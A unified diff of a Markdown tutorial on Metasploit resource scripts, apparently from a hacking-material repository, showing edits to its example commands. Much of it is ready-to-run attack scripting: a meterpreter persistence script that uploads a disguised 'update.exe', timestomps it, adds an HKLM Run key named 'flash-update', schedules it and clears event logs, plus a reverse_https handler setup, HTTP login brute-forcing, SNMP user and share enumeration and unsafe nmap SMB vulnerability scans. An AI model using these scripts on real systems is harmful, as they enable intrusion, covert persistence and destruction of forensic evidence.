@@ -1,6 +1,6 @@
 ## METASPLOIT RESOURCE FILES
 
-<blockquote>Resource scripts provide an easy way for you to automate repetitive tasks in Metasploit. Conceptually, they're just like batch scripts. They contain a set of commands that are automatically and sequentially executed when you load the script in Metasploit. You can create a resource script by chaining together a series of Metasploit console commands and by directly embedding Ruby to do things like call APIs, interact with objects in the database, and iterate actions.</blockquote>
+<blockquote>Resource scripts provide an easy way for you to automate repetitive tasks in Metasploit. Conceptually they're just like batch scripts. They contain a set of commands that are automatically and sequentially executed when you load the script in Metasploit. You can create a resource script by chaining together a series of Metasploit console commands and by directly embedding Ruby to do things like call APIs, interact with objects in the database, and iterate actions.</blockquote>
 
 ![pic](http://i68.tinypic.com/21ovkfm.jpg)
 
@@ -28,7 +28,7 @@
 <br /><br /><br />
 
 ##  HOW TO RUN RESOURCE SCRIPTS?
-<blockquote>You can run resource scripts from msfconsole or from the web interface. Before you can run a resource script, you need to identify the required parameters that need to be configured for the script to run. If you're a Metasploit Framework user, you can run a resource script from msfconsole or meterpreter prompt with the resource command or you can run a resource script when you start msfconsole with the -r flag (making msfconsole executing the rc script at startup).</blockquote>
+<blockquote>You can run resource scripts from msfconsole or from the web interface. Before you can run a resource script, you need to identify the required parameters that need to be configured for the script to run. If you're a Metasploit Framework user, you can run a resource script from msfconsole or meterpreter prompt with the resource command or you can run a resource script when you start msfconsole with the -r flag (making msfconsole executing the resource script at startup).</blockquote>
 
       msfconsole -r script.rc
       msfconsole -r /root/script.rc
@@ -36,7 +36,7 @@
       meterpreter > resource /root/script.rc
       msf exploit(multi/handler) > resource /root/script.rc
 
-<blockquote>Remmenber to start the postgresql service before using msf: sudo service postgresql start</blockquote>
+<blockquote>Remmenber: start the postgresql service before using msf: sudo service postgresql start</blockquote>
 
 #### [!] [Jump to article index](https://github.com/r00t-3xp10it/hacking-material-books/blob/master/metasploit-RC%5BERB%5D/metasploit_resource_files.md#metasploit-resource-files)
 
@@ -45,13 +45,14 @@
 <br /><br /><br />
 
 ## HOW TO WRITE RESOURCE SCRIPTS?
-<blockquote>There are two ways to create a resource script, which are creating the script manually or using the makerc command. personally recommend the makerc command over manual scripting, since it eliminates typing errors. The makerc command saves all the previously issued commands in a file, which can be used with the resource command.</blockquote>
+<blockquote>There are two ways to create a resource script, which are creating the script manually or using the makerc command. personally i recommend the makerc command over manual scripting, since it eliminates typing errors. The makerc command saves all the previously issued commands into a file, which can be used with the resource command.</blockquote>
 
 - **Create a resource file to display the version number of metasploit (manually)::**`[bash prompt]`<br />
 
       touch script.rc
-      echo 'version' > script.rc
-      echo 'exit -y' >> script.rc
+
+         echo 'version' > script.rc
+         echo 'exit -y' >> script.rc
 
     `[run]` msfconsole -r /root/script.rc
 
@@ -65,7 +66,7 @@
 
 <br /><br />
 
-<blockquote>In the next example we are going to write one handler resource file, because there are times when we 'persiste' our payload in target system and a few days passed we dont remmenber the handler configurations set that day, thats one<br />of the reasons rc scripting can be used for, besides automating the framework (erb scripting can access metasploit api).</blockquote>
+<blockquote>In the next example we are going to write one handler resource file, because there are times when we 'persiste' our payload in target system and a few days later we dont remmenber the handler configurations set that day, thats one<br />of the reasons rc scripting can be usefull, besides automating the framework (erb scripting can access metasploit api).</blockquote>
 
 - **Create a resource file using bash terminal prompt::**`[bash prompt]`<br />
 
@@ -92,7 +93,7 @@
 
       msf exploit(multi/handler) > makerc /root/handler.rc
 
-    `[run]` msf > resource /root/handler.rc
+    `[run] msf >` resource /root/handler.rc
 
 <br /><br />
 
@@ -107,7 +108,7 @@
          echo 'sessions -v' >> record.rc
          echo 'loadpath /root/msf-auxiliarys' >> record.rc
          echo 'resource /root/handler.rc' >> record.rc
-         echo 'makerc /root/handler.rc' >> record.rc
+         echo 'makerc /root/commands.rc' >> record.rc
 
     `[run]` msfconsole -r /root/record.rc
 
@@ -137,7 +138,7 @@
         echo 'use post/multi/recon/local_exploit_suggester' >> script.rc
         echo 'run' >> script.rc
 
-     `[run]` meterpreter > resource /root/script.rc
+     `[run] meterpreter >` resource /root/script.rc
 
 <br /><br />
 
@@ -153,10 +154,10 @@
         echo 'upload update.exe %temp%\\update.exe' >> persistence.rc
         echo "timestomp -z '3/10/1999 15:15:15' %temp%\\update.exe" >> persistence.rc
         echo 'reg setval -k HKLM\\Software\\Microsoft\\Windows\\Currentversion\\Run -v flash-update -d %temp%\\update.exe' >> persistence.rc
-        echo 'run scheduleme -m 10 -c "%temp%\\update.exe"' >> persistence.rc
+        echo 'scheduleme -m 10 -c "%temp%\\update.exe"' >> persistence.rc
         echo 'clearev' >> persistence.rc
 
-     `[run]` meterpreter > resource /root/persistence.rc
+     `[run] meterpreter >` resource /root/persistence.rc
 
 <br /><br />
 
@@ -174,6 +175,7 @@
          echo 'run' >> /root/http_brute.rc
          echo 'use auxiliary/scanner/http/http_login' >> /root/http_brute.rc
          echo 'run' >> /root/http_brute.rc
+         echo 'unsetg RHOSTS THREADS' >> /root/http_brute.rc
 
      `[run]` msfconsole -r /root/http_brute.rc
 
@@ -196,13 +198,14 @@
 
          echo 'sysinfo' > /root/gather.rc
          echo 'getuid' >> /root/gather.rc
-         echo 'screenshot' >> /root/gather.rc
+         echo 'services' >> /root/gather.rc
+         echo 'sessions -v' >> /root/gather.rc
 
 - **RC::AutoRunScript::Handler::**`[handler.rc]`<br />
 
       touch handler.rc
 
-         echo 'setg resource /root/gather.rc' > handler.rc
+         echo 'setg RESOURCE /root/gather.rc' > handler.rc
          echo 'use exploit/multi/handler' >> handler.rc
          echo 'set AutoRunScript post/multi/gather/multi_command' >> handler.rc
          echo 'set PAYLOAD windows/meterpreter/reverse_https' >> handler.rc
@@ -210,6 +213,7 @@
          echo 'set LHOST 192.168.1.71' >> handler.rc
          echo 'set LPORT 666' >> handler.rc
          echo 'exploit' >> handler.rc
+         echo 'unsetg RESOURCE' >> handler.rc
 
      `[run]` msfconsole -r /root/handler.rc
 
@@ -233,19 +237,19 @@
 ## USING RUBY IN RC (ERB scripting)
 <blockquote>ERB is a way to embed Ruby code directly into a document. This allow us to call APIs that are not exposed<br />via console commands and to programmatically generate and return a list of commands based on their own logic.<br />Basically ERB scripting its the same thing that writing a metasploit module from scratch using "ruby" programing language and some knowledge of metasploit (ruby) API calls. One of the advantages of using ERB scripting is<br />that we can use simple msfconsole or meterpreter commands together with ruby syntax or metasploit APIs.</blockquote>
 
-- **ERB scripting (ruby)::**`[http_title.rc]`<br />
+- **Running ruby code inside resource files::**`[http_title.rc]`<br />
 
       touch http_title.rc
 
         echo 'workspace -a http_title' > http_title.rc
-        echo 'db_nmap -Pn -T4 -n -v -p 80 --open 192.168.1.0/24' >> http_title.rc
+        echo 'db_nmap -Pn -T4 -sV -p 80 --open 192.168.1.0/24' >> http_title.rc
         echo 'services' >> http_title.rc
-        echo 'use auxiliary/scanner/http/title' >> http_title.rc
         echo '   <ruby>' >> http_title.rc
-        echo '     print_good("Running ruby code inside resource files")' >> http_title.rc
-        echo '     run_single("set RHOSTS #{framework.db.hosts.map(&:address).join(' ')}")' >> http_title.rc
+        echo '     print_good("#### Running ruby code inside resource files ####")' >> http_title.rc
+        echo '     run_single("use auxiliary/scanner/http/title")' >> http_title.rc
+        echo '     run_single("set RHOSTS 192.168.1.0/24")' >> http_title.rc
+        echo '     run_single("exploit")' >> http_title.rc
         echo '   </ruby>' >> http_title.rc
-        echo 'run' >> http_title.rc
         echo 'workspace -d http_title' >> http_title.rc
 
      `[run]` msfconsole -r /root/http_title.rc
@@ -276,7 +280,7 @@
         echo '          run_single("use auxiliary/scanner/vnc/vnc_none_auth")' >> exploiter.rc
         echo '          print_good("Running VNC no auth check against #{h.os_flavor}")' >> exploiter.rc
         echo '          run_single("set RHOSTS #{h.address}")' >> exploiter.rc
-        echo '          run_single("run")' >> exploiter.rc
+        echo '          run_single("exploit")' >> exploiter.rc
         echo '   else' >> exploiter.rc
         echo '          print_error("#{h.address} does not have port 445/5900 open")' >> exploiter.rc
         echo '          return nil' >> exploiter.rc
@@ -290,37 +294,33 @@
 
 <br /><br />
 
-- **FFF**
+- **snmp_enum::post::exploitation::**
 
-      setg 192.168.1.71 192.168.1.254
-
-<br />
-
-      <ruby>
-        print_line("")
-        print_status("Please wait, checking if RHOSTS are set globally.")
-          if (framework.datastore['RHOSTS'] == nil)
-            print_error("[ERROR] Please set RHOSTS globally: setg RHOSTS xxx.xxx.xxx.xxx")
-            return nil
-          end
-
-          # Using nmap to populate metasploit database (db_nmap)
-          print_good("RHOSTS set globally [ OK ] running scans.")
-          self.run_single("db_nmap -sU -sS -Pn -n --script=smb-check-vulns.nse,samba-vuln-cve-2012-1182 --script-args=unsafe=1 -p U:135,T:139,445 #{framework.datastore['RHOSTS']}")
-
-          # Displays msf database results stored into 'services' and 'vulns' 
-          self.run_single("services #{framework.datastore['RHOSTS']}")
-          self.run_single("vulns #{framework.datastore['RHOSTS']}")
-          print_line("")
-
-          print_good("Please wait, running msf auxiliary modules.")
-          self.run_single("use auxiliary/scanner/snmp/snmp_enum")
-          self.run_single("run")
-          self.run_single("use auxiliary/scanner/snmp/snmp_enumusers")
-          self.run_single("run")
-          self.run_single("use auxiliary/scanner/snmp/snmp_enumshares")
-          self.run_single("run")
-      </ruby>
+        echo 'setg RHOSTS 192.168.1.71 192.168.1.254' > snmp_enum.rc
+        echo '<ruby>' >> snmp_enum.rc
+        echo '   print_line("")' >> snmp_enum.rc
+        echo '   print_status("Please wait, checking if RHOSTS are set globally.")' >> snmp_enum.rc
+        echo "      if (framework.datastore['RHOSTS'] == nil or framework.datastore['RHOSTS'] == '')" >> snmp_enum.rc
+        echo '         print_error("[ERROR] Please set RHOSTS globally: setg RHOSTS xxx.xxx.xxx.xxx")' >> snmp_enum.rc
+        echo '         return nil' >> snmp_enum.rc
+        echo '      end' >> snmp_enum.rc
+        echo '' >> snmp_enum.rc
+        echo '         # Using nmap to populate metasploit database (db_nmap)' >> snmp_enum.rc
+        echo '         print_good("RHOSTS set globally [ OK ] running scans.")' >> snmp_enum.rc
+        echo "            run_single(\"db_nmap -sU -sS -Pn -n --script=smb-check-vulns.nse,samba-vuln-cve-2012-1182 --script-args=unsafe=1 -p U:135,T:139,445 #{framework.datastore['RHOSTS']}\")" >> snmp_enum.rc
+        echo "            # Displays msf database results stored into 'services' and 'vulns'" >> snmp_enum.rc 
+        echo '            run_single("services")' >> snmp_enum.rc
+        echo '            run_single("vulns")' >> snmp_enum.rc
+        echo '' >> snmp_enum.rc
+        echo '         print_good("Please wait, running msf auxiliary modules.")' >> snmp_enum.rc
+        echo '      run_single("use auxiliary/scanner/snmp/snmp_enum")' >> snmp_enum.rc
+        echo '      run_single("exploit")' >> snmp_enum.rc
+        echo '      run_single("use auxiliary/scanner/snmp/snmp_enumusers")' >> snmp_enum.rc
+        echo '      run_single("exploit")' >> snmp_enum.rc
+        echo '      run_single("use auxiliary/scanner/snmp/snmp_enumshares")' >> snmp_enum.rc
+        echo '      run_single("exploit")' >> snmp_enum.rc
+        echo '</ruby>' >> snmp_enum.rc
+        echo 'unsetg RHOSTS' >> snmp_enum.rc
 
      `[run]` msfconsole -r /root/script.rc
 
